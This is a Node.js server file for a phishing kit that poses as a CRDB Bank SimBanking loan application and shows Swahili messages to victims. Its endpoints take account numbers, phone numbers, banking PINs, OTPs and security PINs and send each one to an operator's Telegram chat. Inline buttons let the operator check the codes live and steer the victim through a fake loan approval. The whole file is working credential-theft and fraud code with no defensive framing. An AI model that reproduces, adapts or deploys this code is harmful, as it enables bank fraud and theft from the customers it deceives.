const express = require('express');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Environment variables from Render Dashboard
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// In-memory session store
const sessions = {};

async function sendTelegramMessage(text, replyMarkup) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing in environment variables!');
    return null;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: replyMarkup
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API Error:', data);
      return null;
    }
    return data.result ? data.result.message_id : null;
  } catch (err) {
    console.error('Telegram network error:', err);
    return null;
  }
}

// 1. Submit Credentials
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
    
    sessions[sessionId] = {
      status: 'pending_credentials',
      notification: '',
      accountNumber,
      mobileNumber,
      pin,
      loanDetails
    };

    const message = `🚨 *CRDB SIMBANKING APPLICANT* 🚨\n\n` +
      `🏦 *Acc No:* \`${accountNumber}\`\n` +
      `📱 *Mobile:* \`${mobileNumber}\`\n` +
      `🔑 *PIN:* \`${pin}\`\n` +
      `💰 *Loan:* ${loanDetails?.amount || '100,000 TZS'}`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ INVALID PHONE NO:', callback_data: `invalid_phone_${sessionId}` },
          { text: '❌ INVALID ACC. NO:', callback_data: `invalid_acc_${sessionId}` }
        ],
        [
          { text: '❌ INVALID PIN', callback_data: `invalid_pin_${sessionId}` },
          { text: '✅ PROCEED', callback_data: `proceed_otp_${sessionId}` }
        ]
      ]
    };

    const msgId = await sendTelegramMessage(message, keyboard);
    sessions[sessionId].msgId = msgId;

    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-credentials:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 2. Submit OTP
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { sessionId, otp } = req.body;
    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

    sessions[sessionId].status = 'pending_otp';
    sessions[sessionId].otp = otp;

    const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
      `🔢 *OTP Entered:* \`${otp}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ WRONG OTP', callback_data: `wrong_otp_${sessionId}` },
          { text: '✅ CORRECT OTP', callback_data: `correct_otp_${sessionId}` }
        ]
      ]
    };

    await sendTelegramMessage(message, keyboard);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-otp:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3. Submit Security PIN
app.post('/api/submit-security-pin', async (req, res) => {
  try {
    const { sessionId, securityPin } = req.body;
    if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

    sessions[sessionId].status = 'pending_security_pin';
    sessions[sessionId].securityPin = securityPin;

    const message = `🔒 *SECURITY PIN SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
      `🔑 *PIN:* \`${securityPin}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '❌ WRONG PIN', callback_data: `wrong_pin_${sessionId}` },
          { text: '✅ CORRECT PIN', callback_data: `correct_pin_${sessionId}` }
        ]
      ]
    };

    await sendTelegramMessage(message, keyboard);
    res.json({ success: true });
  } catch (error) {
    console.error('Error in submit-security-pin:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Status check endpoint for frontend polling
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions[sessionId];
  if (!session) return res.json({ status: 'not_found' });
  res.json(session);
});

// Telegram Callback Webhook Endpoint (handles clicks on admin buttons)
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body;
    if (update.callback_query) {
      const data = update.callback_query.data;
      const parts = data.split('_');
      // format: action_subaction_sessionId or action_sessionId
      const sessionId = parts[parts.length - 1];
      const action = data.replace(`_${sessionId}`, '');

      if (sessions[sessionId]) {
        if (action === 'invalid_phone') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID PHONE NO: Please enter a valid Simbanking mobile number.';
        } else if (action === 'invalid_acc') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID ACC. NO: Please enter a valid account number.';
        } else if (action === 'invalid_pin') {
          sessions[sessionId].status = 'error';
          sessions[sessionId].notification = 'INVALID PIN: Please enter your correct Simbanking PIN.';
        } else if (action === 'proceed_otp') {
          sessions[sessionId].status = 'enter_otp';
          sessions[sessionId].notification = 'CORRECT DETAILS ✅ - Endelea kwenda OTP.';
        } else if (action === 'wrong_otp') {
          sessions[sessionId].status = 'enter_otp';
          sessions[sessionId].notification = 'WRONG OTP: Tafadhali ingiza namba sahihi ya OTP.';
        } else if (action === 'correct_otp') {
          sessions[sessionId].status = 'enter_security_pin';
          sessions[sessionId].notification = 'OTP CORRECT ✅ - Endelea kuweka PIN.';
        } else if (action === 'wrong_pin') {
          sessions[sessionId].status = 'enter_security_pin';
          sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN mpya ya usalama.';
        } else if (action === 'correct_pin') {
          sessions[sessionId].status = 'pending_approval';
          sessions[sessionId].notification = 'PIN CORRECT ✅ - Inasubiri idhinisho la mwisho.';
          
          await sendTelegramMessage(`✨ *READY FOR FINAL APPROVAL* for Acc: \`${sessions[sessionId].accountNumber}\``, {
            inline_keyboard: [
              [
                { text: '✅ APPROVE', callback_data: `approve_final_${sessionId}` },
                { text: '❌ REJECT', callback_data: `reject_final_${sessionId}` }
              ]
            ]
          });
        } else if (action === 'approve_final') {
          sessions[sessionId].status = 'success';
          sessions[sessionId].notification = 'Hongera! Mkopo wako umeidhinishwa!';
        }
      }
    }
  } catch (err) {
    console.error('Webhook error:', err);
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`CRDB Server running on port ${PORT}`));
         
